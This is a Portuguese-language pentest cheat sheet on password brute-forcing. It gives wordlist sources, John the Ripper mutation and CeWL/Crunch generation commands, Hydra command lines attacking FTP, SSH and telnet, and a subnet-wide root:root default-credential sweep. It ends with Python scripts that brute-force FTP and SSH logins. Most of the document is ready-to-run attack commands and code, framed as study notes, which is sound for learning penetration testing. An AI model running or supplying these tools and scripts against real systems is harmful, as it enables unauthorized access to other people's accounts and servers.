##   Brute Force: Ataques em senhas

**Ataques de Força Bruta**

- Se o sistema não te bloqueia depois de 3 tentativas erradas ele provavelmente permite ataque de força bruta
- Se ele te bloquei mais volta a te permitir tentativas depos de certo tempo tambem é possivel setar o time para o numero de tentativas.
- Podemos analisar tbm caracteristicas do alvo e montar um wordlist com base no alvo
- Podemos tentar senhas default
- Pode ser tambem utilizado wordlists populares.

## Wordlists

**Word Lists Kali**

- usr/share/wordlists
- usr/share/seclists

Comando utilizado para buscar um termo dentro de varias wordlists

`grep -r "termo_pesquisado" *`

Buscando padrões de senha atraves do Google

site:pastebin.com "alvo_pesquisado"

Wordlist Longato

https://github.com/ricardolongatto/loncrack/blob/master/wl.txt




## Gerando mutação em wordlist

- Primeiro crie um lista com possiveis senhas utilizadas pelo alvo
- Depois execute o comando abaixo para fazer a mudação usando o John
- `john --wordlist=wl.txt --rules --stdout > wl_mutacao.txt`

Caso queira acresentar algum tipo de modificação para insereir na mutação, você pode alterar algumas configurações no john

- Acesse: /etc/john/john.conf
- Localize: List Rules Wordlist




## Gerando wordlists personalizadas

**CEWL**

Gerando lista de palavras com base no site

`cewl www.site.com -m 7 -w palavras`

**CRUNCH**

- % Digitos
- ^ Caracteres Especiais
- @ Caracteres Minúsculos
- , Caracteres Maiúsculos

Gerando lista com um padrão especifico

`crunch 10 10 -t palavra^^%% -o wordlist `




## Key Space Brute Force

Exemplo 01

`crunch 4 4 0123456789 -o pin `

Exemplo 02

`crunch 4 4 -f charset.lst mixalpha -o pin `




## Brute force com Hydra

Exemplo

`hydra -v -L users.txt -P senhas.txt 192.168.0.1 ftp`




## Reverse Brute force

*Obs: Realiza o atque de força bruta no login e não na senha*

Exemplo

`hydra -v -L users.txt -p admin 192.168.0.1 ssh`




## Low Hanging Fruit

*Obs: Buscar os pontos mais fracos e fáceis (Ex: credenciais default)*

Exemplo

`hydra -v -l root -p root -M targets ssh`

Exemplo

`hydra -v -l root -p root -M 192.168.0.0/24 ssh`




## Dicas Extras

`man hydra`

Exemplo

`hydra -v -L users.txt -p senhas.txt 192.168.0.1 telnet -t 1 -W 5`




## Construindo sua própria ferramenta

**Brute force ftp em python**

```
#!/usr/bin/python
import socket, sys,re

if len(sys.argv) != 3:
	print "Modo de uso: python lonftp.py 192.168.0.1 usuario"
	sys.exit()

target = sys.argv[1]
usuario = sys.argv[2]

f = open ('wordlist.txt')
for palavra in f.readlines():

	print "Realizando brute force FTP: %s:%s"%(usuario,palavra)

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,21))
	s.recv(1024)

	s.send("USER "+usuario+"\r\n")
	s.recv(1024)
	s.send("PASS "+palavra+"\r\n")
	resposta = s.recv(1024)
	s.send("QUIT\r\n")

	if re.search('230', resposta):
		print "[+] Senha encontrada --->",palavra
		break
```




## Criando um cliente ssh em Python

```
#!/usr/bin/python
import paramiko

ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

ssh.connect('172.16.1.5', username='root', password='root')

stdin, stdout, stderr = ssh.exec_command('ls')

for linha in stdout.readlines():

	print (linha.strip())

ssh.close()
```




## Criando um script para brute force em ssh

```
#!/usr/bin/python
import paramiko

ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

f = open('lista.txt')
for palavra in f.readlines():
	senha = palavra.strip()

	try:

		ssh.connect('172.16.1.5', username='root', password=senha)

	except paramiko.ssh_exception.AuthenticationException:

		print ("Testando com:",senha)
	else:
		print ("[+] Senha Encontrada --->", senha)
		break

ssh.close()
```
